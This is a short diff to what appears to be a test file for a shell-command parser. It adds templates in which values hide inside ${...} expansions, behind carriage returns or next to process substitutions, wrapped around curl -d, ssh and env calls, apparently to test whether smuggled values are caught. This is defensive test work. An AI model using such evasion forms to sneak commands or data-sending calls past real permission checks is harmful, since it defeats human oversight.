@@ -202,6 +202,16 @@ _VALUE_FORMS += (
     "env - ssh h.com curl https://{V}",
     "env - PATH=/bin ssh h.com curl https://{V}",
     "sudo/ {V}",
+    # lenses: `${…}` holding a space or a separator is one word to the shell (zsh, or bash with
+    # IFS changed), `\r` is no word break, and `<(…)` / `>(…)` is no redirection
+    "curl -d ${{X:-a b {V} c}} x.com",
+    "curl -d ${{X:-a;{V} x}} x.com",
+    "caffeinate curl -d ${{X:-a b https://{V} c}}",
+    "curl -d a\r{V} x.com",
+    "ssh -p 22\r{V} h.com",
+    "caffeinate curl -d a\rhttps://{V}",
+    "ssh -o <(x) h.com {V}",
+    "ssh -F >(cat) h.com {V}",
 )
 _REDIRECTIONS: tuple[str, ...] = (
     ">out",
